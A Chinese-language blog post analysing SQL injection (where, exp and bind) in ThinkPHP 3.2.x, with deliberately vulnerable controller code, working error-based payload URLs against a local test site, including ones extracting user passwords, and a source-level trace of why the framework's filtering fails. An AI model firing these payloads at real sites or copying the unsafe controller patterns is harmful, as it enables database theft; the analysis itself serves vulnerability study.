# 原创
：  ThinkPHP3.2.x SQL注入

# ThinkPHP3.2.x SQL注入

#### ThinkPHP3.2.x SQL注入

## 初始配置

> 



### 数据库配置

> 



```
&lt;?php
return array(
    //'配置项'=&gt;'配置值'
    //数据库配置信息
    'DB_TYPE'   =&gt; 'mysql', // 数据库类型
    'DB_HOST'   =&gt; 'localhost', // 服务器地址
    'DB_NAME'   =&gt; 'cms', // 数据库名
    'DB_USER'   =&gt; 'cms', // 用户名
    'DB_PWD'    =&gt; '20010728', // 密码
    'DB_PORT'   =&gt; 3306, // 端口
    'DB_PARAMS' =&gt;  array(), // 数据库连接参数
    'DB_PREFIX' =&gt; '', // 数据库表前缀
    'DB_CHARSET'=&gt; 'utf8', // 字符集
    'DB_DEBUG'  =&gt;  TRUE, // 数据库调试模式 开启后可以记录SQL日志
);

```

### where注入控制器配置

> 
控制器配置，文件位置`Application/Home/Controller/IndexController.class.php`


```
&lt;?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this-&gt;show('&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;','utf-8');
        $data = M('users')-&gt;find(I('GET.id'));
        var_dump($data);
    }
}

```

### exp注入控制器配置

```
&lt;?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this-&gt;show('&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;','utf-8');
        $User = D('Users');
        $map = array('user' =&gt; $_GET['user']);
        $user = $User-&gt;where($map)-&gt;find();
        var_dump($user);
    }
}

```

### bind注入控制器配置

```
&lt;?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this-&gt;show('&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;','utf-8');
        $User = M("Users");
        $user['user_id'] = I('id');
        $data['last_name'] = I('last_name');
        $valu = $User-&gt;where($user)-&gt;save($data);
        var_dump($valu);
    }
}

```

## 漏洞利用

### where注入

> 
Payload：`http://127.0.0.1/cms/?id[where]=1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#`


### exp注入

> 
Payload：`http://127.0.0.1/cms/index.php/Home/Index/index?user[0]=exp&amp;user[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)`


### bind注入

> 
Payload：`http://127.0.0.1/cms/index.php/Home/Index/index?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;last_name=1`


## 漏洞分析

### where注入

> 
从官方文档我们可以知道如果`I()`方法不存在过滤参数的话会默认使用`htmlspecialchars`方法进行过滤，但是同时默认使用的`htmlspecialchars`函数并没有过滤`'`的


> 
跟进`ThinkPHP/Common/functions.php`，如果`$filters`不存在就等值于`C('DEFAULT_FILTER')`而该值正等于`htmlspecialchars`，后面使用回调函数`array_map_recursive`对数据进行过滤


> 
继续往下，后面利用`array_walk_recursive`，如果输入数据是数组的话回调`think_filter`进行数据进一步过滤


> 
跟进`think_filter`方法，如果传入的data是下面数组里面的其中一个就在其后面添加一个空格


> 
进入`find`方法，跟进`ThinkPHP/Library/Think/Model.class.php`，因为我们传入的是一个数组，并且`$pk`值不为数组所以我们就可以直接绕过前面的预设定位到`_parseOptions`


> 
进入`_parseOptions`方法，定位到`_parseType`


> 
进入`_parseType`方法，发现这里对数据进行强制数据类型转换，然后返回给`_parseOptions`，这里对数据进行强制数据类型转换，然后放回，进行数据类型转换后自然是不存在sql注入，所以需要绕过这个函数的过滤，回到上一步发现只有经过`if(isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join']))`这个判断才会进入`_parseType`函数过滤，这里可以使用数组随便绕过


> 
继续往下，进入`select`方法


> 
跟进`ThinkPHP/Library/Think/Db/Driver.class.php`，定位到`buildSelectSql`方法


> 
进入`buildSelectSql`方法，定位到`parseSql`方法


> 
进入`parseSql`方法，从`$options`数组中取出对应的数值在做相对于的处理后拼接到sql语句中，直接执行导致了sql注入漏洞，任意一个一维数组都可以绕过前面的限制但是payload使用的是`id[where]`，因为只有符合对应的数组键值才会取出拼接


> 
拼接后的语句为


```
SELECT * FROM `users` WHERE 1 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)# LIMIT 1 

```

> 
这里还有一些可以利用的Payload


```
?id[group]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
?id[field]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23

```

### exp注入

> 
这里也是使用了`find`方法进行查询，但很明显的一点就是传入的值一开始就是一个数组，并且这里使用原生的GET来传输数据而不是thinkphp提供的`I()`方法，其原因是要注入成功必须要传入exp参数，而在上文中分析`I()`方法是发现会默认对数组一些过滤处理，其中就有exp，而exp后面跟了空格的话会导致注入失败


> 
首先跟进`ThinkPHP/Library/Think/Model.class.php`中的`where`方法看看，因为`$where`是数组而整个where方法其实并没有对该数组什么特别的操作，只是在最后把`$where`数组赋值给了`$options`数组


> 
进入`find`方法，这里和前面跟的一样，并不会对该数组进行过滤，直接看看核心的`select`，跟进到`ThinkPHP/Library/Think/Db/Driver.class.php`中的`parseSql`方法，进入`parseWhere`方法


> 
此时使用payload时候传入的值`$where`为：


```
array(1) {
  ["user"]=&gt;
  array(2) {
    [0]=&gt;
    string(3) "exp"
    [1]=&gt;
    string(46) "=1 and updatexml(1,concat(0x7e,user(),0x7e),1)"
  }
}

```

> 
分析后发现最后会进入到`parseWhereItem`方法中，在`exp`的elseif语句中把where条件直接用点拼接，要满足`$val`是数组，并且索引为0的值为字符串`exp`，那么就可以拼接sql语句了，所以传入`user[0]=exp&amp;user[1]==1 and xxxxxx`，造成SQL注入


### bind注入

> 
前面分析exp注入的时候，不仅exp那里存在问题，bind也同时存在问题，但是这里会在`$val[1]`的前面添加`:`符号导致sql注入失败


> 
进入`save`方法，跟进`ThinkPHP/Library/Think/Model.class.php`，定位到`update`方法


> 
跟进`ThinkPHP/Library/Think/Db/Driver.class.php`中的`update`方法，我们发现它也调用了`parseWhere`方法，结合前面对exp注入的分析，猜测应该还存在bind注入，但是存在一个`:`阻断了注入


> 
跟进`execute`方法，看看怎么处理这个`:`


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/45d5280b5e674dcd876e64b6f7750f7d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1b7ee18ec1714714bb84da68d6b6f7ef.png#pic_center"/>

> 



## 参考文章

> 
戳此查看[参考文章](https://y4er.com/post/thinkphp3-vuln/)

